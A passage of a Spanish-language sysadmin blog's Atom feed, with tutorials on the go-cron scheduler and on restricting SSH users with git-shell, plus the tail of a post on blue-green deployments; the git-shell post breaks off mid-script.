&lt;p&gt;Si compartimos la base de datos entre los entornos &lt;strong&gt;blue&lt;/strong&gt; y &lt;strong&gt;green&lt;/strong&gt;, nos ahorramos la sincronización, a costa de no poder modificar nada en el entorno de pruebas, ya que estaríamos modificando los mismos datos que se usan en el entorno de producción.&lt;/p&gt;
&lt;p&gt;Un punto espinoso en esta configuración compartido son las migraciones de la base de datos; hacerlas antes causaría &lt;em&gt;downtime&lt;/em&gt; en la versión anterior hasta instalar la nueva versión, y hacerlas después causaría &lt;em&gt;downtime&lt;/em&gt; en la nueva versión hasta poder hacer la migración. La solución más aceptada es hacer una &lt;em&gt;release&lt;/em&gt; intermedia, capaz de trabajar con la base de datos migrada y sin migrar; sería responsabilidad de esta &lt;em&gt;release&lt;/em&gt; intermedia detectar si la base de datos está migrada o no, y suplir las carencias mediante lógica específica.&lt;/p&gt;</content><category term="blue-green"></category><category term="deployment"></category></entry><entry><title>Un cron alternativo con go: go-cron</title><link href="https://www.linuxsysadmin.ml/2018/05/un-cron-alternativo-con-go-go-cron.html" rel="alternate"></link><published>2018-05-21T10:00:00+02:00</published><updated>2018-05-21T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-21:/2018/05/un-cron-alternativo-con-go-go-cron.html</id><summary type="html">&lt;p&gt;Quiero presentar una de esas herramientas que ya existen, pero que alguien ha reescrito con el lenguaje &lt;strong&gt;go&lt;/strong&gt;. Se trata de una utilidad tipo &lt;em&gt;cron&lt;/em&gt;, pero está compilada de forma estática, no necesita de otras librerías y, por lo tanto, lo podemos usar en donde no tengamos permisos de &lt;em&gt;root …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Quiero presentar una de esas herramientas que ya existen, pero que alguien ha reescrito con el lenguaje &lt;strong&gt;go&lt;/strong&gt;. Se trata de una utilidad tipo &lt;em&gt;cron&lt;/em&gt;, pero está compilada de forma estática, no necesita de otras librerías y, por lo tanto, lo podemos usar en donde no tengamos permisos de &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Instalación de go-cron&lt;/h2&gt;
&lt;p&gt;El binario &lt;strong&gt;go-cron&lt;/strong&gt; no depende de librerías externas, tratándose de un binario estático que podemos tener, por ejemplo, en nuestra carpeta personal.&lt;/p&gt;
&lt;p&gt;Su instalación se limita a descargarse el binario de &lt;a href="https://github.com/odise/go-cron/releases"&gt;GitHub&lt;/a&gt; y usar; el fichero descargado es un binario precompilado y comprimido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ wget -O go-cron.gz https://github.com/odise/go-cron/releases/download/v0.0.7/go-cron-linux.gz
...  
Petición HTTP enviada, esperando respuesta... &lt;span class="m"&gt;200&lt;/span&gt; OK
Longitud: &lt;span class="m"&gt;1755640&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,7M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Grabando a: “go-cron.gz”

go-cron.gz               &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[====================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;,67M  &lt;span class="m"&gt;1&lt;/span&gt;,49MB/s   en &lt;span class="m"&gt;1&lt;/span&gt;,1s   

&lt;span class="m"&gt;2018&lt;/span&gt;-04-25 &lt;span class="m"&gt;11&lt;/span&gt;:13:41 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,49 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “go-cron.gz” guardado &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1755640&lt;/span&gt;/1755640&lt;span class="o"&gt;]&lt;/span&gt;

gerard@sirius:~/workspace$ gunzip go-cron.gz 
gerard@sirius:~/workspace$ chmod &lt;span class="m"&gt;755&lt;/span&gt; go-cron 
gerard@sirius:~/workspace$ strip go-cron 
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El binario viene con los símbolos de &lt;em&gt;debug&lt;/em&gt;; si ejecutamos el comando &lt;em&gt;strip&lt;/em&gt;, lo podemos bajar de 6mb a 4.3mb.&lt;/p&gt;
&lt;h2&gt;Uso de go-cron&lt;/h2&gt;
&lt;p&gt;Empezamos con una visión general de lo que podemos hacer con el binario, que no es mucho:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -h
Usage of ./go-cron &lt;span class="o"&gt;(&lt;/span&gt;build 6f160c2 &lt;span class="o"&gt;)&lt;/span&gt;
./go-cron  &lt;span class="o"&gt;[&lt;/span&gt; OPTIONS &lt;span class="o"&gt;]&lt;/span&gt; -- &lt;span class="o"&gt;[&lt;/span&gt; COMMAND &lt;span class="o"&gt;]&lt;/span&gt;
  -h&lt;span class="o"&gt;=&lt;/span&gt;false: display usage
  -p&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;18080&amp;quot;&lt;/span&gt;: &lt;span class="nb"&gt;bind&lt;/span&gt; healthcheck to a specific port, &lt;span class="nb"&gt;set&lt;/span&gt; to &lt;span class="m"&gt;0&lt;/span&gt; to not open HTTP port at all
  -s&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;* * * * *&amp;quot;&lt;/span&gt;: schedule the task the cron style
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: A diferencia de otras herramienta tipo &lt;em&gt;cron&lt;/em&gt;, esta se encarga de gestionar &lt;strong&gt;una sola tarea&lt;/strong&gt;. Junto con el hecho de que el proceso ejecuta en primer plano, lo hace ideal para su uso en contenedores &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La parte más importante es que demos la especificación temporal (&lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-s&lt;/code&gt;) y el comando a ejecutar. Podemos encontrar documentación para la especificación temporal &lt;a href="https://godoc.org/github.com/robfig/cron"&gt;aquí&lt;/a&gt;. Esta puede ser de 3 tipos: tipo &lt;em&gt;cron&lt;/em&gt;, tiempos preconfigurados y por intervalos.&lt;/p&gt;
&lt;h3&gt;Especificación tipo cron&lt;/h3&gt;
&lt;p&gt;Se trata de dar 5 o 6 valores, que indican respectivamente el segundo, el minuto, la hora, el día del mes, el mes, y -opcionalmente- el día de la semana.&lt;/p&gt;
&lt;p&gt;Estos valores pueden tener intervalos, comodines e incrementos, justo como en el &lt;em&gt;cron&lt;/em&gt; normal. Por ejemplo, para lanzar un comando en el segundo 0, cada 30 minutos, entre las 10 y las 20 horas, los días 1 y 15 del mes de todos los meses, usaríamos algo como esto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;0 */30 10-20 1,15 *&amp;quot;&lt;/span&gt; -- &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hola&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:19:32 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:19:32 new cron: &lt;span class="m"&gt;0&lt;/span&gt; */30 &lt;span class="m"&gt;10&lt;/span&gt;-20 &lt;span class="m"&gt;1&lt;/span&gt;,15 *
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:19:32 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Valores preconfigurados&lt;/h3&gt;
&lt;p&gt;Alternativamente, &lt;strong&gt;go-cron&lt;/strong&gt; nos ofrece unos valores preconfigurados que simplifican la expresión, a costa de perder especificaciones más caprichosas. A saber:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@yearly&lt;/code&gt; o &lt;code&gt;@annually&lt;/code&gt; &amp;rarr; Ejecuta cada año, concretamente el 1 de enero (equivale a &lt;code&gt;0 0 0 1 1 *&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@monthly&lt;/code&gt; &amp;rarr; Ejecuta una vez al mes, en el día 1 (equivale a &lt;code&gt;0 0 0 1 * *&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@weekly&lt;/code&gt; &amp;rarr; Ejecuta cada semana, a medianoche del domingo (equivale a &lt;code&gt;0 0 0 * * 0&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@daily&lt;/code&gt; o &lt;code&gt;@midnight&lt;/code&gt; &amp;rarr; Ejecuta una vez al día, a medianoche (equivale a &lt;code&gt;0 0 0 * * *&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@hourly&lt;/code&gt; &amp;rarr; Ejecuta cada hora, a su principio (equivale a &lt;code&gt;0 0 * * * *&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, para ejecutar un &lt;em&gt;backup&lt;/em&gt; diario, podríamos hacer algo como lo siguiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;@daily&amp;quot;&lt;/span&gt; -- ./backup_database.sh
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:27:45 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:27:45 new cron: @daily
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:27:45 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Especificación por intervalos&lt;/h3&gt;
&lt;p&gt;También podemos instruir a &lt;strong&gt;go-cron&lt;/strong&gt; para que ejecute cada cierto tiempo, con el &lt;em&gt;keyword&lt;/em&gt; &lt;code&gt;@every&lt;/code&gt;. Esto nos dejaría una línea de comandos como esta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;@every 1m30s&amp;quot;&lt;/span&gt; -- ./send_keepalive.sh
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:30:25 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:30:25 new cron: @every 1m30s
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:30:25 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: La primera ejecución se hace cuando ha pasado el tiempo especificado tras levantar &lt;strong&gt;go-cron&lt;/strong&gt;. Las siguientes lo hacen sin tener en cuenta el tiempo de ejecución del comando dado. En caso de ejecutar cada hora, y tardar el &lt;em&gt;script&lt;/em&gt; 40 minutos, saltaría el siguiente en unos 20 minutos tras la finalización del actual; en casos extremos, podríamos tener solapamiento de ejecuciones.&lt;/p&gt;
&lt;h3&gt;El servicio de healthcheck&lt;/h3&gt;
&lt;p&gt;El &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-p&lt;/code&gt; sirve para indicar el puerto en el que vamos a contar con un &lt;em&gt;webservice&lt;/em&gt; con información de lo que pasa en &lt;strong&gt;go-cron&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ ./go-cron -s &lt;span class="s2"&gt;&amp;quot;@every 10s&amp;quot;&lt;/span&gt; -- ./do_something.sh 
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:38:32 Running version: 6f160c2
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:38:32 new cron: @every 10s
&lt;span class="m"&gt;2018&lt;/span&gt;/04/25 &lt;span class="m"&gt;12&lt;/span&gt;:38:32 Opening port &lt;span class="m"&gt;18080&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; health checking
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://localhost:18080/
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;Running&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;9107&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;Exit_status&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;Stdout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;Stderr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;ExitTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;Pid&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;9107&lt;/span&gt;,
      &lt;span class="s2"&gt;&amp;quot;StartingTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2018-04-25T12:39:02+02:00&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;Last&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;Exit_status&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;Stdout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;hello\n&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;Stderr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ExitTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2018-04-25T12:38:57+02:00&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;Pid&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;9096&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;StartingTime&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2018-04-25T12:38:52+02:00&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;Schedule&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;@every 10s&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se puede desactivar indicando puerto 0, pero igual le podéis encontrar una utilidad...&lt;/p&gt;</content><category term="cron"></category><category term="go"></category><category term="go-cron"></category></entry><entry><title>Una jaula SSH con git-shell</title><link href="https://www.linuxsysadmin.ml/2018/05/una-jaula-ssh-con-git-shell.html" rel="alternate"></link><published>2018-05-14T10:00:00+02:00</published><updated>2018-05-14T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-14:/2018/05/una-jaula-ssh-con-git-shell.html</id><summary type="html">&lt;p&gt;El otro día recibí una petición en el trabajo por parte de un cliente: poder ejecutar algunas operaciones por SSH en nuestro servidor. Solo de pensar en montar una jaula SSH con los binarios y sus librerías ya se me hizo cuesta arriba, y por eso lo hice con &lt;strong&gt;git-shell …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día recibí una petición en el trabajo por parte de un cliente: poder ejecutar algunas operaciones por SSH en nuestro servidor. Solo de pensar en montar una jaula SSH con los binarios y sus librerías ya se me hizo cuesta arriba, y por eso lo hice con &lt;strong&gt;git-shell&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;No he encontrado por internet nadie que haya hecho algo similar, así que lo he puesto por escrito en este artículo. Se trata de utilizar el &lt;em&gt;shell&lt;/em&gt; restringido &lt;strong&gt;git-shell&lt;/strong&gt; para que el usuario solo pueda utilizar los &lt;em&gt;scripts&lt;/em&gt; o binarios presentes en la carpeta &lt;code&gt;~/git-shell-commands/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Por defecto, &lt;strong&gt;git-shell&lt;/strong&gt; solo acepta las operaciones necesarias para trabajar remotamente con repositorios &lt;em&gt;git&lt;/em&gt;. Esto se puede leer en &lt;a href="https://git-scm.com/docs/git-shell"&gt;la documentación&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Call the corresponding server-side command to support the client’s git push, git fetch, or git archive --remote request.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sin embargo, ante la presencia de una carpeta &lt;code&gt;~/git-shell-commands/&lt;/code&gt; también nos añade los &lt;em&gt;scripts&lt;/em&gt; y binarios de la misma al conjunto de operaciones que podemos ejecutar.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If a ~/git-shell-commands directory is present, git shell will also handle other, custom commands by running "git-shell-commands/&lt;command&gt; &lt;arguments&gt;" from the user’s home directory.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Esto está pensado para operaciones administrativas como crear, borrar y modificar los repositorios alojados. Sin embargo, podemos utilizarlo para limitar los comandos que un usuario puede ejecutar, sean o no de &lt;em&gt;git&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Por supuesto, el soporte a operaciones remotas de &lt;em&gt;git&lt;/em&gt; no nos molesta; al no haber repositorios, estas operaciones van a fallar de todas formas. Así pues, vamos a centrarnos en nuestras propias operaciones.&lt;/p&gt;
&lt;h2&gt;Un ejemplo simple&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor con SSH, al que vamos a llamar &lt;em&gt;server&lt;/em&gt;. Para la demostración, se va a tratar de un servidor &lt;strong&gt;Alpine Linux&lt;/strong&gt;, aunque esto no es relevante.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: A menos que se diga lo contrario, todos los comandos se ejecutan con &lt;em&gt;root&lt;/em&gt;, aunque podéis usar &lt;em&gt;sudo&lt;/em&gt; con el mismo efecto.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Las sesiones de SSH a &lt;em&gt;server&lt;/em&gt; responden con el nombre &lt;em&gt;localhost&lt;/em&gt;. Esto es debido a que el servidor es un contenedor &lt;strong&gt;docker&lt;/strong&gt; con el puerto 22 mapeado al puerto 22 del servidor &lt;em&gt;sirius&lt;/em&gt;; al ser un ejemplo, prefiero no virtualizar máquinas nuevas.&lt;/p&gt;
&lt;p&gt;Para disponer del binario &lt;strong&gt;git-shell&lt;/strong&gt;, necesitamos el paquete &lt;strong&gt;git&lt;/strong&gt; instalado. Si no lo tenéis hecho, es el mejor momento para hacerlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:~# apk add --no-cache git
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing ca-certificates &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20171114&lt;/span&gt;-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing libssh2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.8.0-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing libcurl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.59.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.2.5-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.30-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing git &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.15.0-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.27.2-r7.trigger
Executing ca-certificates-20171114-r0.trigger
OK: &lt;span class="m"&gt;20&lt;/span&gt; MiB in &lt;span class="m"&gt;20&lt;/span&gt; packages
server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un usuario para que nuestro cliente pueda entrar por SSH; nada nuevo por el momento, con la excepción de que vamos a indicar como su &lt;em&gt;shell&lt;/em&gt; el mismo &lt;strong&gt;git-shell&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:~# adduser -D customer -s /usr/bin/git-shell
server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;customer:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
chpasswd: password &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;customer&amp;#39;&lt;/span&gt; changed
server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si el usuario intenta entrar en este punto, solo podrá utilizar las operaciones &lt;em&gt;git&lt;/em&gt; remotas, siendo imposible que lance una sesión interactiva, o comandos sueltos por SSH.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

fatal: Interactive git shell is not enabled.
hint: ~/git-shell-commands should exist and have &lt;span class="nb"&gt;read&lt;/span&gt; and execute access.
Connection to localhost closed.
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server hostname
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="s1"&gt;&amp;#39;s password: &lt;/span&gt;
&lt;span class="s1"&gt;fatal: unrecognized command &amp;#39;&lt;/span&gt;hostname&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para activar &lt;strong&gt;git-shell&lt;/strong&gt;, hay que crear la carpeta indicada &lt;code&gt;~/git-shell-commands&lt;/code&gt;; los comandos que se pueden ejecutar son los que van dentro de la misma.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /home/customer/
server:/home/customer# mkdir git-shell-commands
server:/home/customer# chown customer:customer git-shell-commands/
server:/home/customer# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con esto el usuario ya va a poder entrar en una sesión interactiva, aunque no dispone de comandos para ejecutar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="s1"&gt;&amp;#39;s password: &lt;/span&gt;
&lt;span class="s1"&gt;Welcome to Alpine!&lt;/span&gt;

&lt;span class="s1"&gt;The Alpine Wiki contains a large amount of how-to guides and general&lt;/span&gt;
&lt;span class="s1"&gt;information about administrating Alpine systems.&lt;/span&gt;
&lt;span class="s1"&gt;See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.&lt;/span&gt;

&lt;span class="s1"&gt;You can setup the system with the command: setup-alpine&lt;/span&gt;

&lt;span class="s1"&gt;You may change this message by editing /etc/motd.&lt;/span&gt;

&lt;span class="s1"&gt;git&amp;gt; hostname&lt;/span&gt;
&lt;span class="s1"&gt;unrecognized command &amp;#39;&lt;/span&gt;hostname&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
git&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría rellenar la carpeta con los binarios o &lt;em&gt;scripts&lt;/em&gt; que este usuario pueda necesitar. Como punto interesante, si existe un &lt;code&gt;help&lt;/code&gt;, este se va a ejecutar al entrar por SSH de forma automática, y nos puede servir para que el usuario sepa que hacer (o para que pida ayuda en el medio de una sesión).&lt;/p&gt;
&lt;p&gt;El resto de comandos son libres y podéis hacer literalmente lo que queráis, con el entendido que estos &lt;em&gt;scripts&lt;/em&gt; pueden invocar todos los comandos del sistema de forma normal, pero  el usuario solo va a poder ejecutar estos &lt;em&gt;scripts&lt;/em&gt;. Veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:/home/customer# &lt;span class="nb"&gt;cd&lt;/span&gt; git-shell-commands/
server:/home/customer/git-shell-commands# cat &lt;span class="nb"&gt;help&lt;/span&gt; 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Permitted commands:&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  help - shows this help message&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  hostname - shows hostname of this server&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  get_connected_users - shows user currently logged on&amp;quot;&lt;/span&gt;
server:/home/customer/git-shell-commands# cat hostname 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

hostname
server:/home/customer/git-shell-commands# cat get_connected_users 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nv"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$RANDOM&lt;/span&gt;
&lt;span class="nb"&gt;let&lt;/span&gt; n%&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;
